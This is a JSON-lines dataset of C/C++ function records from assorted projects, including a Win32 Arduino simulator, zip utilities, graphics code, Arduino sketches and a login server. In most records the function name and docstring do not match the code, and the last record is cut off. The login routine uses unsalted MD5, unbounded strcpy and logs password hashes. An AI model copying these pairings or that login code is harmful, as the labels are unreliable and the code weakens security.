{"content":"{'function_name': 'run_arduino', 'docstring': '\/* returns the thread identifier. *\/', 'code': 'int main()\\n{\\n    MSG Msg;\\n    WNDCLASSEX wc;\\n    \/\/hWndMain = FindWindowA(\"TApplication\", \"EMU\"); \/\/ search for external emulator\\n\\n    \/\/ Registering the Window Class\\n    wc.cbSize = sizeof(WNDCLASSEX);\\n    wc.style = 0;\\n    wc.lpfnWndProc = WndProc;\\n    wc.cbClsExtra = 0;\\n    wc.cbWndExtra = 0;\\n    wc.hInstance = hInstance;\\n    wc.hIcon = LoadIcon(NULL, IDI_APPLICATION);\\n    wc.hCursor = LoadCursor(NULL, IDC_ARROW);\\n    wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);\\n    wc.lpszMenuName = NULL;\\n    wc.lpszClassName = g_szClassName;\\n    wc.hIconSm = LoadIcon(NULL, IDI_APPLICATION);\\n    if (!RegisterClassEx(&wc))\\n    {\\n        MessageBox(NULL, \"Window Registration Failed!\", \"Error!\", MB_ICONEXCLAMATION | MB_OK);\\n        return 0;\\n    }\\n    hFont = CreateFont(-16, 0, 0, 0, FW_NORMAL, 0, 0, 0, DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY, FF_DONTCARE, \"Courier New\");\\n\\n    \/\/ Creating the Window\\n    hWndMain = CreateWindowEx(WS_EX_CLIENTEDGE, g_szClassName,\\n        \"Arduino Simulator 2019 WizIO\",\\n        WS_OVERLAPPEDWINDOW,CW_USEDEFAULT, CW_USEDEFAULT, 640, 480,\\n        NULL, NULL, hInstance, NULL);\\n    if (hWndMain == NULL)\\n    {\\n        MessageBox(NULL, \"Window Creation Failed!\", \"Error!\", MB_ICONEXCLAMATION | MB_OK);\\n        return 0;\\n    }\\n    SetWindowPos(hWndMain, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOACTIVATE or SWP_NOMOVE or SWP_NOSIZE);\\n\\n    \/\/ Creating the Edit\\n    hEdit = CreateWindowEx(WS_EX_CLIENTEDGE, \"EDIT\", \"\",\\n                           WS_CHILD | WS_VISIBLE | WS_VSCROLL | ES_MULTILINE | ES_AUTOVSCROLL, \/\/ | ES_AUTOHSCROLL,\\n                           0, 200, 620, 240,\\n                           hWndMain, (HMENU)0, GetModuleHandle(NULL), NULL);\\n    SendMessage(hEdit, WM_SETFONT, (WPARAM)hFont, MAKELPARAM(true, 0));\\n\\n    extern void create_leds();\\n    create_leds();\\n\\n    extern void createDisplay();\\n    createDisplay();\\n\\n    ShowWindow(hWndMain, 1);\\n    UpdateWindow(hWndMain);\\n\\n    run_arduino();\\n\\n    \/\/ The Message Loop\\n    while (GetMessage(&Msg, NULL, 0, 0) > 0)\\n    {\\n        TranslateMessage(&Msg);\\n        DispatchMessage(&Msg);\\n    }\\n    startedArduino = 0;\\n    return Msg.wParam;\\n}'}","id":0}
{"content":"{'function_name': 'ex04', 'docstring': '\/\/ g) ---------------------------------------------', 'code': 'void ex05()\\n{\\n\\tint input;\\n\\tint ARRAY[5];\\n\\tint sum = 0;\\n\\tint product = 1;\\n\\n\\t\/\/ a) ---------------------------------------------------\\n\\tstd::cout << \"Please enter 5 numbers\\\\n\";\\n\\n\\tfor (int i = 0; i <= 4; i++)\\n\\t{\\n\\t\\tstd::cout << \">> \";\\n\\t\\tstd::cin >> input;\\n\\t\\tARRAY[i] = input;\\n\\t}\\n\\n\\t\/\/ b) ---------------------------------------------------\\n\\tfor (int i = 0; i <= 4; i++)\\n\\t{\\n\\t\\tsum += ARRAY[i];\\n\\t}\\n\\tstd::cout << \"Array Sum: \" << sum << std::endl;\\n\\n\\tfor (int i = 0; i <= 4; i++)\\n\\t{\\n\\t\\tproduct *= ARRAY[i];\\n\\t}\\n\\tstd::cout << \"Array Product: \" << product << std::endl;\\n\\n\\t\/\/ c) ---------------------------------------------------\\n\\tarrayInput(ARRAY, 5);\\n\\n\\t\/\/ d) ---------------------------------------------------\\n\\tarrayContents(ARRAY, 5);\\n\\n\\treturn;\\n}'}","id":4}
{"content":"{'function_name': 'GetAllFiles', 'docstring': '\/\/\u662f\u6587\u4ef6\u76f4\u63a5\u52a0\u5165', 'code': 'void AddFileToZip(zipFile zf, string fileNameInZip, string srcFile)\\n{\\n\\tFILE* srcfp = NULL;\\n\\n\\t\/\/\u521d\u59cb\u5316\u5199\u5165zip\u7684\u6587\u4ef6\u4fe1\u606f\\n\\t\/\/zip_fileinfo zi;\\n\\tzip_fileinfo   zi = { 0 };\\n\\n\\tzi.tmz_date.tm_sec = zi.tmz_date.tm_min = zi.tmz_date.tm_hour =\\n\\t\\tzi.tmz_date.tm_mday = zi.tmz_date.tm_mon = zi.tmz_date.tm_year = 0;\\n\\tzi.dosDate = 0;\\n\\tzi.internal_fa = 0;\\n\\tzi.external_fa = 0;\\n\\n\\t\/\/\u5982\u679csrcFile\u4e3a\u7a7a\uff0c\u52a0\u5165\u7a7a\u76ee\u5f55    \\n\\tstring new_file_name = \"\";\\n\\t\/\/if (fileNameInZip == \"json\")\\n\\t\/\/\\tfileNameInZip = \"\";\\n\\tnew_file_name += fileNameInZip;\\n\\tif (srcFile == \"\")\\n\\t{\\n\\t\\tnew_file_name += \"\/\";\\n\\t}\\n\\n\\t\/\/\u5728zip\u6587\u4ef6\u4e2d\u521b\u5efa\u65b0\u6587\u4ef6    \\n\\t\/\/zipOpenNewFileInZip(zf, new_file_name.c_str(), &zi, NULL, 0, NULL, 0, NULL, Z_DEFLATED, Z_DEFAULT_COMPRESSION);\\n\\tzipOpenNewFileInZip(zf, new_file_name.c_str(), &zi, NULL, 0, NULL, 0, NULL, 0, Z_DEFAULT_COMPRESSION);\/\/\u6ce8\u610f\u8fd9\u91cc\uff0c0\uff0c\u9ed8\u8ba4\u538b\u7f29\u7b97\u6cd5\u4e3aStore.\\n\\n\\tif (srcFile != \"\")\\n\\t{\\n\\t\\t\/\/\u6253\u5f00\u6e90\u6587\u4ef6    \\n\\t\\tfopen_s(&srcfp, srcFile.c_str(), \"rb\");\\n\\t\\tif (srcfp == NULL)\\n\\t\\t{\\n\\t\\t\\tprintf(\"\u65e0\u6cd5\u6dfb\u52a0\u6587\u4ef6: %s !\\\\n\", srcFile);\\n\\t\\t\\tzipCloseFileInZip(zf); \/\/\u5173\u95edzip\u6587\u4ef6  \\n\\t\\t\\treturn;\\n\\t\\t}\\n\\n\\t\\t\/\/\u8bfb\u5165\u6e90\u6587\u4ef6\u5e76\u5199\u5165zip\u6587\u4ef6    \\n\\t\\tchar buf[100 * 1024]; \/\/buffer    \\n\\t\\tint numBytes = 0;\\n\\t\\twhile (!feof(srcfp))\\n\\t\\t{\\n\\t\\t\\tnumBytes = fread(buf, 1, sizeof(buf), srcfp);\\n\\t\\t\\tzipWriteInFileInZip(zf, buf, numBytes);\\n\\t\\t\\tif (ferror(srcfp))\\n\\t\\t\\t\\tbreak;\\n\\t\\t}\\n\\n\\t\\t\/\/\u5173\u95ed\u6e90\u6587\u4ef6    \\n\\t\\tfclose(srcfp);\\n\\t}\\n\\n\\t\/\/\u5173\u95edzip\u6587\u4ef6    \\n\\tzipCloseFileInZip(zf);\\n}'}","id":5}
{"content":"{'function_name': 'to_d3d_element', 'docstring': '\/\/ https:\/\/learn.microsoft.com\/en-us\/windows\/win32\/api\/d3d12\/ns-d3d12-d3d12_input_element_desc', 'code': 'inline D3D12_INPUT_ELEMENT_DESC to_d3d_element(\\n      const std::unique_ptr<graphics::shaders::ivert_element>& e_p,\\n      graphics::input_data_class_t inClass,\\n      graphics::input_slot_t slot) noexcept\\n   {\\n\\n      \/\/ https:\/\/learn.microsoft.com\/en-us\/windows\/win32\/api\/d3d12\/ns-d3d12-d3d12_input_element_desc\\n      D3D12_INPUT_ELEMENT_DESC ret;\\n      ret.SemanticName = e_p->name().c_str();\\n      ret.SemanticIndex = static_cast<UINT>(e_p->index());\\n      ret.InputSlotClass = graphics::to_d3d_input_class(inClass);\\n      ret.InputSlot = graphics::to_d3d_input_slot(slot);\\n      ret.Format = e_p->format();\\n      ret.AlignedByteOffset = D3D12_APPEND_ALIGNED_ELEMENT;\\n      ret.InstanceDataStepRate = 0;\\n      return ret;\\n   }'}","id":7}
{"content":"{'function_name': 'init', 'docstring': '\/\/init fine', 'code': 'bool load_files()\\n{\\n     \/\/Load bg image\\n     background = load_image( \"bg.png\" );\\n     dot = load_image( \"dot.bmp\" );\\n     \\n     \/\/load font\\n     font = TTF_OpenFont( \"lazy.ttf\", 24 );\\n     \\n     \/\/if problem\\n     if( dot == NULL || background == NULL )\\n     {\\n         return false;\\n     }\\n     if( font == NULL )\\n     {\\n         return false;\\n     }\\n     \\n     return true;\\n}'}","id":15}
{"content":"{'function_name': 'Source', 'docstring': '\/\/ We need to URL-encode the string.', 'code': 'StatusOr<std::string> FetchRegion(ExternalAccountTokenSourceAwsInfo const& info,\\n                                  std::string const& metadata_token,\\n                                  HttpClientFactory const& cf,\\n                                  Options const& opts,\\n                                  internal::ErrorContext const& ec) {\\n  for (auto const* name : {\"AWS_REGION\", \"AWS_DEFAULT_REGION\"}) {\\n    auto env = internal::GetEnv(name);\\n    if (env.has_value()) return std::move(*env);\\n  }\\n\\n  auto payload = GetMetadata(info.region_url, metadata_token, cf, opts);\\n  if (!payload) return std::move(payload).status();\\n  if (payload->empty()) {\\n    return InvalidArgumentError(\\n        absl::StrCat(\"invalid (empty) region returned from \", info.region_url),\\n        GCP_ERROR_INFO().WithContext(ec));\\n  }\\n  \/\/ The metadata service returns an availability zone, so we must remove the\\n  \/\/ last character to return the region.\\n  payload->pop_back();\\n  return *std::move(payload);\\n}'}","id":16}
{"content":"{'function_name': 'doit', 'docstring': '\/\/ output the debug if the map file is present', 'code': 'int main (int argc, char * * argv)\\n#endif\\n{\\n\\t\/\/ Just call doit and show possible errors.\\n\\n\\ttry\\n\\t{\\n\\t\\treturn doit (argc, argv);\\n\\t}\\n\\tcatch (std::logic_error & e)\\n\\t{\\n\\t\\t* perr << \"ERROR: \" << e.what () << endl <<\\n\\t\\t\\t\"This error is unexpected, please \"\\n\\t\\t\\t\"send a bug report.\" << endl;\\n\\t}\\n\\tcatch (std::exception & e)\\n\\t{\\n\\t\\t* perr << \"ERROR: \" << e.what () << endl;\\n\\t}\\n\\tcatch (Usage &)\\n\\t{\\n\\t\\tcerr <<\\t\"Pasmo v. \" << pasmoversion <<\\n\\t\\t\\t\" (C) 2004-2005 Julian Albo\\\\n\\\\n\"\\n\\t\\t\\t\"Usage:\\\\n\\\\n\"\\n\\t\\t\\t\"\\\\tpasmo [options] source object [symbol]\\\\n\\\\n\"\\n\\t\\t\\t\"See the README file for details.\\\\n\";\\n\\t}\\n\\tcatch (...)\\n\\t{\\n\\t\\tcerr << \"ERROR: Unexpected exception.\\\\n\"\\n\\t\\t\\t\"Please send a bug report.\\\\n\";\\n\\t}\\n\\n\\t\/\/ Added to fix Debian bug report #394733\\n\\treturn 1;\\n}'}","id":21}
{"content":"{'function_name': 'isConnected', 'docstring': '\/\/ Check if all non-zero degree vertices are visited', 'code': 'int isEulerian()\\n{\\n    \/\/ Check is all non-zero degree vertices are connected\\n    if(isConnected() == false)\\n        return 0;\\n    \/\/ Count vertices with odd degree\\n    int odd = 0;\\n    for(int i = 0; i < N; i++)\\n        if(adj[i].size() & 1)\\n        odd++;\\n    \/\/ If count is more than 2, then graph is not Eulerian\\n    if(odd > 2)\\n        return 0;\\n    \/\/ If odd count is 2, then semi-eulerian\\n    \/\/ If odd count is 0, then eulerian\\n    \/\/ Note that odd count can never be 1 for undirected graph\\n    return (odd)? 1 : 2;\\n}'}","id":22}
{"content":"{'function_name': 'IsXInputDevice', 'docstring': '\/\/ Loop over all devices', 'code': 'static BOOL CALLBACK DIEnumEffectsCallback(LPCDIEFFECTINFO ei, LPVOID pvRef)\\n{\\n  \/\/HRESULT              hr;\\n  \/\/LPDIRECTINPUTDEVICE8 lpdid = (LPDIRECTINPUTDEVICE8)pvRef;    \\n  Assert (ei->dwSize>=sizeof(DIEFFECTINFO));\\n\\n  if (DIEFT_GETTYPE(ei->dwEffType) == DIEFT_CONSTANTFORCE)\\n  {\\n    LogF(\"Constant force %s\",ei->tszName);\\n    LogF(\"  Static  %s\",(const char *)GetParamNames(ei->dwStaticParams));\\n    LogF(\"  Dynamic %s\",(const char *)GetParamNames(ei->dwDynamicParams));\\n  }\\n  if (DIEFT_GETTYPE(ei->dwEffType) == DIEFT_RAMPFORCE)\\n  {\\n    LogF(\"Ramp force %s\",ei->tszName);\\n    LogF(\"  Static  %s\",(const char *)GetParamNames(ei->dwStaticParams));\\n    LogF(\"  Dynamic %s\",(const char *)GetParamNames(ei->dwDynamicParams));\\n  }\\n  if (DIEFT_GETTYPE(ei->dwEffType) == DIEFT_PERIODIC)\\n  {\\n    LogF(\"Periodic %s\",ei->tszName);\\n    LogF(\"  Static  %s\",(const char *)GetParamNames(ei->dwStaticParams));\\n    LogF(\"  Dynamic %s\",(const char *)GetParamNames(ei->dwDynamicParams));\\n  }\\n  if (DIEFT_GETTYPE(ei->dwEffType) == DIEFT_CONDITION)\\n  {\\n    LogF(\"Condition %s\",ei->tszName);\\n    LogF(\"  Static  %s\",(const char *)GetParamNames(ei->dwStaticParams));\\n    LogF(\"  Dynamic %s\",(const char *)GetParamNames(ei->dwDynamicParams));\\n  }\\n\\n\\n  return DIENUM_CONTINUE;\\n}'}","id":23}
{"content":"{'function_name': 'sendScoreToDisplay', 'docstring': '\/\/ stop transmitting', 'code': 'void sendBallCreditToDisplay(byte gameCredits_in, byte gameBalls_in)\\n{\\n  wireWriteData[0] = ASCII_DOLLAR;\\n  wireWriteData[1] = ASCII_C;\\n  wireWriteData[2] = ASCII_A;\\n  wireWriteData[3] = ASCII_N;\\n  wireWriteData[4] = (8); \/\/ this is ID for Credit-Ball PinScore display\\n  wireWriteData[5] = 10; \/\/ 10 displays as blank\\n  wireWriteData[6] = (gameCredits_in\/10);\\n  wireWriteData[7] = (gameCredits_in-(wireWriteData[6]*10));\\n  wireWriteData[8] = 10; \/\/10 displays as blank\\n  wireWriteData[9] = 0;\\n  wireWriteData[10] = gameBalls_in;\\n  wireWriteData[11] = ASCII_CR;\\n\\n  Wire.beginTransmission(4); \/\/ transmit to player one Arduino LED\\n  Wire.write(wireWriteData,12);\\n  Wire.endTransmission();    \/\/ stop transmitting\\n\\n  return;\\n}'}","id":35}
{"content":"{'function_name': 'connectToCamera', 'docstring': '\/\/ String to Char*', 'code': 'bool connectToServerRC() {\\n    bool result = true;\\n    const int jsonPort = 7878;\\n \\n    \/\/ Open Tcp connection\\n    if (!client.connect(\"192.168.42.1\", jsonPort)) {\\n        result = false;\\n        \\n    }\\n    Serial.println(\"Webserver Connected\");\\n \\n    return result;\\n}'}","id":38}
{"content":"{'function_name': 'Swap', 'docstring': '\/\/this is the trade off element as we can see.', 'code': 'Iter find_the_max(Iter i1,Iter i2){\\n    \/\/here we can use the next part of the loop and find a loop invariant as we can see\\n    Iter max = i1;\\n    i1++;\\n    while(i1!=i2){\\n        if(*max<*i1){\\n            max = i1;\\n        }\\n        ++i1;\\n    }\\n    return max;\\n}'}","id":42}
{"content":"{'function_name': 'create_metric_tensor2D', 'docstring': '\/\/only for ndim = 3!!', 'code': 'double compute_inner_product_fast(const double *x, data_info d){\\n    \/\/Try to eliminate some inefficiencies in the code, no more explicit transposing\\n    \/\/Optimize matrix products to reduce the number of multiplications all in a singls\\n    \/\/function.\\n    \/\/\\n    \/\/data_info d = *((struct data_info *)data);\\n    double max,sum,squarediff, dp;\\n    int i, j, t, s;\\n    \/\/row1, col2, row2\\n    \/\/B*-1 * alpha(B) \\n    \/\/resulting B_shape * ndim array\\n    sum=0;\\n    squarediff=0;\\n\\n    for (int i = 0 ; i < d.B_shape ; i++ ){\\n        for (int j = 0 ; j < d.ndim ; j++ ){\\n            for (int k = 0 ; k < d.B_shape ; k++ ){\\n                sum += d._cycle_cocycle_I[i][k]*d.rep[k][j];\\n            }\\n        \\n            d.M1[i][j] = sum;\\n            sum=0; \\n \\n        }\\n    }\\n    \\n\\n    sum=0;\\n    \/\/need the diagonal values first\\n    for (int r = 0; r < d.B_shape; r++){\\n        for (int k = 0; k < d.ndim; k++){\\n            \/\/ VALID ONLY FOR d.ndim == 3!!!!!!!!!\\n            t = (k*2)%d.ndim;\\n            s = (k*2+1)%d.ndim;\\n            sum += d.Z[k] * d.M1[r][k] * d.M1[r][k];\\n            sum += d.Z[k+3] * 2 * d.M1[r][t]*d.M1[r][s];\\n        }\\n        if(sum<0)sum=500;\\n        d.diag2[r] = sum;\\n        d.diag[r] = sqrt(sum);\\n\\n        sum=0;\\n    }\\n    max=d.diag2[d.diag_ind];\\n\\n    for (int r = 0 ; r < d.nz_size ; r++ ){\\n        i = d._zi[r];\\n        j = d._zj[r];\\n        if(i==j){\\n            dp = d.diag2[i]\/max - d._ip_mat[i][j];\\n            d.stored_dp[r] = dp;\\n            squarediff += pow(dp, 2);\\n            \/\/squarediff += pow((d.diag2[i] - d._ip_mat[i][j]), 2);\\n        }\\n        else{\\n            for (int k = 0 ; k < d.ndim ; k++ ){\\n                sum += d.Z[k] * (d.M1[i][k]*d.M1[j][k]);\\n            \\n                \/\/ VALID ONLY FOR d.ndim == 3!!!!!!!!!\\n                t = (k*2)%d.ndim;\\n                s = (k*2+1)%d.ndim;\\n\\n                sum += d.Z[k+3]*(d.M1[i][t]*d.M1[j][s] + d.M1[i][s]*d.M1[j][t]);\\n            }\\n            dp = sum\/d.diag[i]\/d.diag[j] - d._ip_mat[i][j];\\n            d.stored_dp[r] = dp;\\n            squarediff += pow(dp, 2);\\n            \/\/squarediff += pow((sum - d._ip_mat[i][j]), 2);\\n            sum=0;\\n        }\\n    }\\n    return squarediff;\\n}'}","id":46}
{"content":"{'function_name': 'getBytePattern', 'docstring': '\/\/ byte b = i;', 'code': 'unsigned long getLongPattern(int i) {\\n  unsigned long l;\\n  \/\/ Shift a 1 to the ith bit\\n  \/\/ unsigned long l = (unsigned long)1L<<i;\\n  \/\/ Or, use bitset to set an individual bit (count from right)\\n  bitSet(l, i);\\n  return l;\\n}'}","id":48}
{"content":"{'function_name': 'printNote', 'docstring': '\/\/ the right note.', 'code': 'void clearNote (uint8_t note) {\\n  if ((note < LOWEST_NOTE) || (note > HIGHEST_NOTE)) {\\n    return;\\n  }\\n  \/\/ See comments in printNote about Y coordinates of notes\\n  int noteY = NOTE_YS + notecoords[note-LOWEST_NOTE]*NOTE_YO;\\n  if (noteY != 0) {\\n    if (sharps[note-LOWEST_NOTE]) {\\n      fillNote(note, NOTE_SXO, noteY, ST77XX_WHITE);\\n      fillSharp(noteY, ST77XX_WHITE);\\n    } else {\\n      fillNote(note, NOTE_XO, noteY, ST77XX_WHITE);\\n    }\\n  }\\n}'}","id":63}
{"content":"{'function_name': 'Split', 'docstring': '\/\/\u5148\u5c06\u8981\u5207\u5272\u7684\u5b57\u7b26\u4e32\u4ecestring\u7c7b\u578b\u8f6c\u6362\u4e3achar*\u7c7b\u578b', 'code': 'double AngleNormalization(double angle) {\\n    \/\/ Constrain to less than pi\\n    while (angle > M_PI) angle -= 2.0 * M_PI;\\n\\n    \/\/ Constrain to greater than -pi\\n    while (angle < -M_PI) angle += 2.0 * M_PI;\\n    return angle;\\n}'}","id":64}
{"content":"{'function_name': 'denoiseb_rd47_select', 'docstring': '\/\/__VIVADO_SYNTH__', 'code': 'inline hw_uint<16> denoiseb_rd48_select(raw_cache& raw, int d0, int d1) {\\n#ifdef __VIVADO_SYNTH__\\n#endif \/\/__VIVADO_SYNTH__\\n  \/\/ denoiseb_rd48 read pattern: { denoiseb_update_0[d0, d1] -> raw[3 + 2d0, 1 + d1] : -1 <= d0 <= 961 and -1 <= d1 <= 1082 }\\n  \/\/ Read schedule : { denoiseb_update_0[d0, d1] -> [2 + d1, 1 + d0, 2] : -1 <= d0 <= 961 and -1 <= d1 <= 1082 }\\n  \/\/ Write schedule: { raw_update_0[d0, d1] -> [d1, d0, 1] : -2 <= d0 <= 962 and -3 <= d1 <= 1084 }\\n  \/\/ DD fold: { denoiseb_update_0[d0, d1] -> 965 : -1 <= d0 <= 960 and -1 <= d1 <= 1082; denoiseb_update_0[d0, d1] -> (4 + d0) : d0 = 961 and -1 <= d1 <= 1082 }\\n  auto value_raw_raw_update_0_write1 = raw.raw_raw_update_0_write1_merged_banks_25.peek_965();\\n  return value_raw_raw_update_0_write1;\\n#ifndef __VIVADO_SYNTH__\\n\\tcout << \"Error: Unsupported offsets: \" << \" d0 = \" << d0  << \" d1 = \" << d1  << endl;\\n\\tassert(false);\\n\\treturn 0;\\n#endif \/\/__VIVADO_SYNTH__\\n}'}","id":65}
{"content":"{'function_name': 'findElm_P', 'docstring': '\/\/----------------------------------------', 'code': 'address_parent findElmName_P(List_parent L, infotype_parent x) {\\n    \/**\\n    * IS : List_parent L mungkin kosong\\n    * FS : mengembalikan elemen dengan info nim = x.nim,\\n    * FS : mengembalikan elemen dengan info = x,\\n           mengembalikan Nil jika tidak ditemukan\\n    *\/\\n    address_parent P = first(L);\\n    do {\\n        if(P->info.name == x.name) {\\n            return P;\\n        }\\n        P = next(P);\\n    } while(P != first(L));\\n    return NULL;\\n}'}","id":66}
{"content":"{'function_name': 'drawBackgroundWaveform', 'docstring': '\/\/RGB(255, 128, 0)', 'code': 'UINT EndAnalyzeThread(LPVOID pParam)\\n{\\n\\tpAnalyzeDlg->m_bRunAnalyze = FALSE;\\n\\n\\t\/\/ Wait\\n\\twhile (bRunAnalyzeThread) { Sleep(1); }\\n\\n\\tReadImageKill();\\n\\tNetClo(ConnectSocket);\\n\\tConnectSocket = NULL;\\n\\n\\n\\t\/\/ Change Button\\n\\tpAnalyzeDlg->m_Btn_PlayAnalyze.SetWindowTextW(_T(\"Play\"));\\n\\tpAnalyzeDlg->m_Btn_PlayAnalyze.EnableWindow(TRUE);\\n\\n\\treturn 0;\\n}'}","id":70}
{"content":"{'function_name': 'main', 'docstring': '\/\/inchidem conexiunea cu baza de date', 'code': 'int LoginClient (struct thData tdL)\\n{\\n    int credentialsLen;\\n    char *credentials = (char*) malloc (62);\\n\\n    fflush (stdout); \/\/golim buffer-ul succesiv\\n    if (read (tdL.cl, &credentialsLen, 4) <= 0)\\n    {\\n        printf(\"[Thread %d]\\\\n\",tdL.idThread);\\n        perror (\"Eroare la read()-ul lungimii string-ului de credentials de la client.\\\\n\");\\n    }\\n    \/\/printf(\"%d\\\\n\",credentialsLen);\\n\\n    fflush (stdout);\\n    if (read(tdL.cl,credentials,credentialsLen) <=0)\\n    {\\n        printf(\"[Thread %d]\\\\n\",tdL.idThread);\\n        perror (\"Eroare la read()-ul stringului de credentials de la client.\\\\n\");\\n    }\\n    \/\/printf(\"%s\\\\n\",credentials);\\n\\n    char* password = (char*) malloc (30);\\n    char *pch;\\n\\n    bzero(username, 30);\\n    bzero(password, 30);\\n\\n    pch = strtok(credentials, \"$\");\\n    strcpy(username, pch);\\n    pch = strtok(NULL, \"$\");\\n    strcpy(password, pch);\\n\\n    \/\/criptam parola cu functia MD5\\n    std::string encryptedPassword;\\n    encryptedPassword=md5(password);\\n\\n    printf(\"Cautam in LearNet.db datele de logare si trimitem clientului confirmarea daca acestea sunt gasite.\\\\n\");\\n    int confirmation=0;\\n    QSqlQuery query;\\n\\n    char * enc_pass = new char[encryptedPassword.length() + 1];\\n    std::copy(encryptedPassword.begin(), encryptedPassword.end(), enc_pass);\\n    enc_pass[encryptedPassword.size()] = \\'\\\\0\\';\\n\\n    \/*\\n    strcpy (interogare, \"SELECT * FROM users WHERE username LIKE \\'\");\\n    strcat (interogare, username);\\n    strcat (interogare, \"%\\' ;\");\\n    *\/\\n\\n    query.prepare(\"SELECT * FROM users WHERE username=? and encrypted_password=?\");\\n    query.bindValue(0, username);\\n    query.bindValue(1,enc_pass);\\n\\n    \/\/executam interogarea si trimitem la server confirmarea\\n    query.exec();\\n    if (query.first()) \/\/arata prima inregistrare din tabela care corespunde selectului\\n    {\\n        confirmation=1;\/\/am gasit userul\\n        printf(\"Am gasit username-ul %s, cu parola criptata %s.\\\\n\", username, enc_pass);\\n\\n        if (write (tdL.cl, &confirmation, 4) <=0)\\n        {\\n            printf(\"[Thread %d] \",tdL.idThread);\\n            perror (\"[Thread]Eroare la write()-ul confirmarii de Login catre client.\\\\n\");\\n        }\\n    }\\n    else\\n    {\\n        confirmation=0; \/\/username-ul introdus sau parola sunt gresite\\n        printf(\"Nu am gasit username-ul %s, cu parola criptata %s.\\\\n\", username, enc_pass);\\n        if (write (tdL.cl, &confirmation, 4) <=0)\\n        {\\n            printf(\"[Thread %d] \",tdL.idThread);\\n            perror (\"[Thread]Eroare la write()-ul confirmarii de Login catre client.\\\\n\");\\n        }\\n    }\\n    return confirmation;\\n}'}","id":74}
{"content":"{'function_name': 'open_firmware_file', 'docstring': '\/\/ Success', 'code': 'int get_firmware_size(int *firmware_size)\\n{\\n    int err = TP_SUCCESS;\\n    struct stat file_stat;\\n\\n    \/\/ Make Sure File Handler is Valid\\n    if(g_firmware_fd < 0)\\n    {\\n        ERROR_PRINTF(\"%s: FW file has not been opened. firmware_fd=%d.\\\\r\\\\n\", __func__, g_firmware_fd);\\n        err = EBADFD;\\n        goto GET_FIRMWARE_SIZE_EXIT;\\n    }\\n\\n    \/\/ Get File Status\\n    err = fstat(g_firmware_fd, &file_stat);\\n    if(err < 0)\\n    {\\n        ERROR_PRINTF(\"%s: Fail to Get Firmware File Size! errno=%d.\\\\r\\\\n\", __func__, errno);\\n        err = TP_ERR_FILE_NOT_FOUND;\\n    }\\n    else\\n    {\\n        \/\/DEBUG_PRINTF(\"%s: File Size = %zd.\\\\r\\\\n\", __func__, file_stat.st_size);\\n        *firmware_size = file_stat.st_size;\\n        err = TP_SUCCESS;\\n    }\\n\\nGET_FIRMWARE_SIZE_EXIT:\\n    return err;\\n}'}","id":93}
{"content":"{'function_name': 'setup', 'docstring': '\/*\\n  byte storage = EEPROM.read(0);\\n  if (storage == 255 || storage == DEFAULT_ADDRESS){\\n    current_address = DEFAULT_ADDRESS;\\n  }\\n  else {\\n    current_address = storage;\\n  }\\n  *\/', 'code': 'void resetAddress(byte address){\\n  \/\/EEPROM.write(0, address); \\n  current_address = address;\\n  Wire.onReceive(receiveEvent);\\n  Wire.begin(address);\\n  return;\\n}'}","id":95}
{"content":"{'function_name': 'attachPlugins', 'docstring': '\/\/ not GTA', 'code': 'static int32\\ngetSizeBreakableModel(void *object, int32 offset, int32)\\n{\\n\\tBreakable *breakable = *PLUGINOFFSET(Breakable*, object, offset);\\n\\tif(breakable == nil)\\n\\t\\treturn 0; \/\/4;\\n\\treturn 56 + breakable->numVertices*(12+8+4) +\\n\\t            breakable->numFaces*(6+2) +\\n\\t            breakable->numMaterials*(32+32+12);\\n}'}","id":96}
{"content":"{'function_name': 'DECL_LOADGLEXT_PROC', 'docstring': '\/\/ Duplicate in GL_ARB_get_program_binary', 'code': 'static bool DECL_LOADGLEXT_PROC(EXT_stencil_two_side)\\n{\\n    \/\/correct extension ??? maybe \"GL_ATI_separate_stencil\"\\n    LOAD_GLPROC( glStencilFuncSeparate );\\n    LOAD_GLPROC( glStencilMaskSeparate );\\n    LOAD_GLPROC( glStencilOpSeparate   );\\n    return true;\\n}'}","id":105}
{"content":"{'function_name': 'MkInformName', 'docstring': '\/\/\u0414\u043e\u0431\u0430\u0432\u0438\u043b\u0438 \u043d\u043e\u043c\u0435\u0440 \u0447\u0430\u0441\u0442\u0438', 'code': 'int MakeOneStrForTree(char *oneStr, char *Name, char *Ext, PAR_FILE *pf)\/\/\u0421\u043e\u0437\u0434\u0430\u043d\u0438\u0435 \u0441\u0442\u0440\u043e\u043a\u0438 \u0441\u0438\u043c\u0432\u043e\u043b\u043e\u0432 \u0434\u043b\u044f \u043e\u0442\u0440\u0430\u0436\u0435\u043d\u0438\u044f \u0432 \u0434\u0435\u0440\u0435\u0432\u0435\\n{\\n   char size[32], *as;\\n   if(pf->type == 48)                                        \/\/\u042d\u0442\u043e \u0438\u043c\u044f \u043f\u0430\u043f\u043a\u0438\\n   {  sprintf(oneStr, \"%s\", Name);                           \/\/\u0414\u043b\u044f \u043f\u0430\u043f\u043a\u0438 \u043d\u0438\u0447\u0435\u0433\u043e \u043d\u0435 \u043c\u0435\u043d\u044f\u0435\u043c\\n      return 0;\\n   }\\n   if(prMEDIA == 1)                                          \/\/\u041f\u0430\u043f\u043a\u0430 MEDIA\\n      if(ChangeNameInMEDIA(Name, Ext, pf) == 1) return 1;    \/\/\u0418\u0437\u043c\u0435\u043d\u043d\u0438\u0435 \u0438\u043c\u0435\u043d\u0438 \u0432 \u043f\u0430\u043f\u043a\u0435 MEDIA\\n   if(prMEDIA == 1 && Conf.altName == 0 && tabMME != NULL)\\n      MkInformName(Name, Ext);                               \/\/\u0424\u043e\u0440\u043c\u0438\u0440\u043e\u0432\u0430\u043d\u0438\u0435 \u0438\u043d\u0444\u043e\u0440\u043c\u0430\u0442\u0438\u0432\u043d\u043e\u0433\u043e \u0438\u043c\u0435\u043d\u0438\\n   if(*Ext != 0)                                             \/\/\u0414\u043e\u0431\u0430\u0432\u0438\u043b\u0438 \u0440\u0430\u0441\u0448\u0438\u0440\u0435\u043d\u0438\u0435 \u0435\u0441\u043b\u0438 \u043e\u043d\u043e \u0435\u0441\u0442\u044c\\n   {  lstrcat(Name, \".\");\\n      lstrcat(Name, Ext);\\n   }\\n   int l = sprintf(oneStr, \"  %s\", Name);\\n   for(int i=l; i<256; i++)                                  \/\/\u0417\u0430\u043f\u043e\u043b\u043d\u0438\u043b\u0438 \u0445\u0432\u043e\u0441\u0442 \u0441\u0442\u0440\u043e\u043a\u0438 